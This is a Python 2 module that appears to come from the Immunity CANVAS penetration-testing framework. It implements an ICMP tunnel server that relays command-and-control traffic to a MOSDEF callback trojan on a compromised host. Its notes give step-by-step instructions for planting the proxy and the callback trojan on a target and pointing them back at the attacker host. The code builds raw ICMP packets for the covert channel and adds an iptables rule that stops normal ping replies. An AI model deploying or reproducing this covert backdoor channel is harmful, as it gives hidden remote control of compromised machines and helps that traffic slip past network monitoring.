#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys

#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import socket
import threading
##Depreciated in Python 2.6
#import popen2
import subprocess

from exploitutils import *
from encoder      import addencoder
from shellcode    import shellcodeGenerator, win32shell # win32shell / linuxshell ???
from sniffer      import checksum

from ExploitTypes.utility import Utility

NOTES="""
This module must be run as the 'root' user on a Linux based system in order to prevent the local
operating system from responding to ping requests. Using a Linux-based virtual machine such as the
BackTrack3 distribution is a suitable substitute. Follow these steps to use it:

1) Deploy the remote ICMP proxy to the target host (Resources/icmp_proxy.exe)
2) Deploy a MOSDEF callback trojan to the remote host (backdoors/mosdef_callbacks/mosdef_callback.exe)
3) With CANVAS running as root, set your target to be the remote host that is calling home to CANVAS (where
you dropped your ICMP proxy and the MOSDEF callback).
4) Run Servers->icmp_proxy.
5) On the remote host, run icmp_proxy.exe with the following command line options:

-l <Local Address to bind to>
-p <Local Port to bind to>
-t <Remote CANVAS host>

icmp_proxy.exe -l 127.0.0.1 -p 5555 -t 192.168.244.1

6) Run your MOSDEF callback to point to the local ICMP proxy.

mosdef_callback.exe 127.0.0.1 5555
"""



NAME="ICMP Proxy for MOSDEF Callbacks"
DESCRIPTION="ICMP Proxy for MOSDEF Callbacks"
DOCUMENTATION={}
DOCUMENTATION["Repeatability"]="Use it all day long."
DOCUMENTATION["Notes"] = NOTES
VERSION="2.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Servers"

CHANGELOG="""

"""
class theexploit(Utility):    
    def __init__(self):
        Utility.__init__(self)        
        
        self.canvas_port    = 5555
        self.canvas_ip      = "127.0.0.1"
        self.canvas_sock    = {}
        self.icmp_sock      = None
        
        # Various message headers
        self.connect_string = "|connec|"
        self.ignore_string  = "|ignore|"
        self.more_string    = "|more..|"
        self.last_string    = "|last..|"
        
        # For setting up the messages 
        self.header_field   = 8
        self.length_field   = 4
        self.seq_field      = 4
        self.sess_id_field  = 4
        self.chunk_size     = 512
        self.message_size   = self.chunk_size - self.header_field - self.length_field - self.seq_field - self.sess_id_field
        
        self.read_bytes       = 0
        self.seq_num          = {}
        self.session_ids      = {}
        self.packet_queue     = {}
        self.max_seq_distance = 5
        
        self.active_out       = {}
        self.active_in        = {}
        
        self.iptables_command = "iptables -A INPUT -p icmp --icmp-type echo-request -j DROP"
        
    def getArgs(self):
        self.canvas_port     = int( self.argsDict.get("canvas_port", self.canvas_port) )
        self.canvas_ip       = self.argsDict.get("canvas_ip", self.canvas_ip)
        self.chunk_size      = int(self.argsDict.get("chunk_size", self.chunk_size))

    def connect_to_canvas( self, session_id ):
        """
        Connects to the CANVAS listener to prepare to proxy data in/out.
        """
        self.log("ICMP Proxy -> Connecting to CANVAS at %s:%d" % ( self.canvas_ip, self.canvas_port ) )
        
        # Setup our CANVAS socket
        self.canvas_sock[session_id] = self.gettcpsock()
        self.canvas_sock[session_id].connect(( self.canvas_ip, self.canvas_port ))
        
        # Create an ICMP socket for responses
        self.icmp_sock   = socket.socket( socket.AF_INET, socket.SOCK_RAW, 1 )
        
        # Setup the proxy buffers
        self.active_in[session_id]   = ''
        self.active_out[session_id]  = ''
    
    def send_icmp_response( self, ident, seq, dst_addr, response_payload, session_id ):
        print "Sending ICMP response to remote host."
        
        # icmp start
        icmp_checksum   = 0
        icmp_buffer     = []
        icmp_buffer    += ["\x00\x00"]
        icmp_buffer    += [struct.pack(">H", icmp_checksum)]
        icmp_buffer    += [struct.pack(">H", ident)]
        icmp_buffer    += [struct.pack(">h", seq)]
        icmp_buffer    += response_payload
        icmp_buffer     = "".join(icmp_buffer)
        
        icmp_checksum   = checksum( icmp_buffer )
        
        icmp_buffer     = []
        icmp_buffer    += ["\x00\x00"]
        icmp_buffer    += [struct.pack(">H", icmp_checksum)]
        icmp_buffer    += [struct.pack(">H", ident)]
        icmp_buffer    += [struct.pack(">h", seq)]
        icmp_buffer    += response_payload
        icmp_buffer     = "".join(icmp_buffer)
        #icmp end
        
        icmp_packet     = "".join(icmp_buffer)
        
        self.icmp_sock.sendto( icmp_packet, (dst_addr, 1 ))
        
        # Add this to our retry queue
        self.packet_queue[session_id][self.seq_num[session_id]] = response_payload
        
        return None
    
    def send_to_canvas( self, session_id ):
        
        while len(self.active_in[session_id]):
            
            self.log("ICMP Proxy <- Piping %d bytes in (0x%08x)" % ( len(self.active_in[session_id]), session_id ))
            
            sent                       = self.canvas_sock[session_id].send(self.active_in[session_id])
            self.active_in[session_id] = self.active_in[session_id][sent:]
            
        try:
            self.canvas_sock[session_id].settimeout(0.5)
            self.active_out[session_id] += self.canvas_sock[session_id].recv(8192)
        except:
            pass
        
        self.log("ICMP Proxy -> Piping %d bytes out (0x%08x)" % ( len(self.active_out[session_id]) , session_id ))
        
        return
            
    def sniffer_callback( self, parser ):
                
        ident       = parser.attribs["identifier"]
        seq         = parser.attribs["seqnum"]
        dst_addr    = parser.attribs["ipsource"]
        payload     = parser.attribs["icmpdata"][4:]
        length      = 0

                
        # Trap the sequence number
        seq_num         = payload[12:16]
        seq_num         = struct.unpack("<L", seq_num)[0]
        
        # Trap the session id
        session_id      = payload[16:20]
        session_id      = struct.unpack("<L", session_id)[0]

        # Something bad happened
        if seq_num == 0 or session_id == 0:
            return
        
        print "[ICMP Proxy] Received sequence number: %d (0x%08x)" % ( seq_num, session_id )
                
        # Check for the initial connection string
        if self.connect_string in payload:
            print "[ICMP Proxy] Received connection string from remote host."
            self.seq_num[session_id]       = 0
            self.session_ids[session_id]   = session_id
            self.packet_queue[session_id]  = {}
            self.connect_to_canvas( session_id )
                    
        # If this is a retry grab the packet from the queue
        if self.seq_num[session_id] == seq_num or self.packet_queue[session_id].has_key( seq_num ):           
            
                print "[ICMP Proxy] Retransmitting packet with sequence number %d (0x%08x)" % ( seq_num , session_id )
                
                self.send_icmp_response( ident, seq, dst_addr, self.packet_queue[session_id][ seq_num ], session_id )
                return
            
        elif self.seq_num[session_id] < seq_num:
            
            # The sequence number has incremented get rid of the old packet
            # we leave a buffer of self.max_seq_distance previous packets in case a retransmit 
            # is required, this is to save memory but still provide reliability
            
                try:
                    del self.packet_queue[session_id][ seq_num - self.max_seq_distance ]
                except KeyError:
                    pass
                
                self.seq_num[session_id]    = seq_num
                
               
        # Check for more data incoming
        if self.more_string in payload:
            length                      = payload[8:12]
            length                      = struct.unpack("<L", length)[0]                                      
            self.active_in[session_id] += payload[20:20+length]
            print "[ICMP Proxy] Received %d bytes in a MORE packet" % length
            
        # Check for final packet
        if self.last_string in payload:
            length                      = payload[8:12]
            length                      = struct.unpack("<L", length)[0]
            self.active_in[session_id] += payload[20:20+length]
            print "[ICMP Proxy] Received %d bytes in the LAST packet" % length
            
            # Send the data off to CANVAS
            self.send_to_canvas( session_id )
       
        # If there's data waiting to be ICMP'd out fire it off
        if len(self.active_out[session_id]):
            
            # Do it 512-byte chunks, if there's more than 512 we 
            # send a MORE packet
            if len(self.active_out[session_id]) > self.message_size:
                print "[ICMP Proxy] Sending ICMP response [MORE] to -> %s (0x%08x)" % ( dst_addr, session_id )
                # Packet -> header + length + payload
                response_packet  = self.more_string 
                response_packet += struct.pack("<L", self.message_size )
                response_packet += struct.pack("<L", self.seq_num[session_id])
                response_packet += struct.pack("<L", session_id)
                response_packet += self.active_out[session_id][:self.message_size]
                
                # Send the response and adjust the out buffer
                self.send_icmp_response( ident, seq, dst_addr, response_packet, session_id )
                self.active_out[session_id] = self.active_out[session_id][self.message_size:]
                
            
            # No more data, send LAST packet
            elif len(self.active_out[session_id]):
                print "[ICMP Proxy] Sending ICMP response [LAST] to -> %s" % dst_addr
                response_packet   = self.last_string
                response_packet  += struct.pack("<L", len(self.active_out[session_id]))
                response_packet  += struct.pack("<L", self.seq_num[session_id])
                response_packet  += struct.pack("<L", session_id)
                response_packet  += self.active_out[session_id]
                
                # Send the response and adjust the out buffer
                self.send_icmp_response( ident, seq, dst_addr, response_packet, session_id )
                self.active_out[session_id] = self.active_out[session_id][len(self.active_out[session_id]):]
                
        else:
            
            # We simply send the IGNORE message type to keep the
            # communication channel primed
            response_packet  = self.ignore_string
            response_packet += "\x00" * 4
            response_packet += struct.pack("<L", self.seq_num[session_id])
            response_packet += struct.pack("<L", session_id)
            
            # We received a CONNECT request, it needs the max packet size
            # to be returned, we honor a minimum 512-byte first packet size
            # then it gets auto-adjusted to self.chunk_size here and on the 
            # remote end
            if self.seq_num[session_id] == 1:
                response_packet += struct.pack("<L", self.chunk_size )
                response_packet += "\x00" * ( 512 - 20 )
            else:
                response_packet += "\x00" * ( self.chunk_size - 16 )
            
            self.send_icmp_response( ident, seq, dst_addr, response_packet, session_id )
            
            # Check for data waiting on the CANVAS sock
            if self.canvas_sock[session_id]:
                
                try:
                    self.canvas_sock[session_id].settimeout(0.1)
                    self.active_out[session_id] += self.canvas_sock[session_id].recv( 8192 )
                except:
                    # There's no data waiting, just pass
                    pass
                
        return
            
    def run(self):
        
        self.getArgs()
        
        # Make sure our iptables is dropping packets
        self.log("Running %s to allow CANVAS to respond to ICMP" % self.iptables_command)
        ##Depreciated in Python 2.6
        #popen2.popen2( self.iptables_command )
        subprocess.Popen(self.iptables_command, shell=True)

                
        # Fire up the listener
        listener_thread = threading.Thread(target=self.engine.start_listener, args=(self.canvas_ip, "WIN32 MOSDEF INTEL", self.canvas_port ) )
        listener_thread.start()

        self.setInfo("Setup ICMP proxy to %s:%d" % ( self.canvas_ip, self.canvas_port ) )
        
        filter = "ipsource(%s) ipproto(ICMP)" % self.target.interface
        self.engine.register_sniffer_callback( self.sniffer_callback, filter )  
        
        self.setInfo("%s - finished setting up proxy. (Success)" % NAME )
        
        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
